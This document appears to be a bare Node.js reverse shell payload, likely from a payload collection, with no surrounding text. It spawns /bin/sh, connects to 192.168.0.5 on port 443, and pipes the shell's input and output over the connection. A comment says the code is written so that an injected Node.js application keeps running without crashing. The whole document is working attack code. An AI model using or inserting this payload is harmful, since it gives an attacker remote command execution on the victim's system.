(function () {
  var net = require("net"),
    cp = require("child_process"),
    sh = cp.spawn("/bin/sh", []);
  var client = new net.Socket();
  client.connect(443, "192.168.0.5", function () {
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
  });
  return /a/; // Prevents the Node.js application form crashing
})();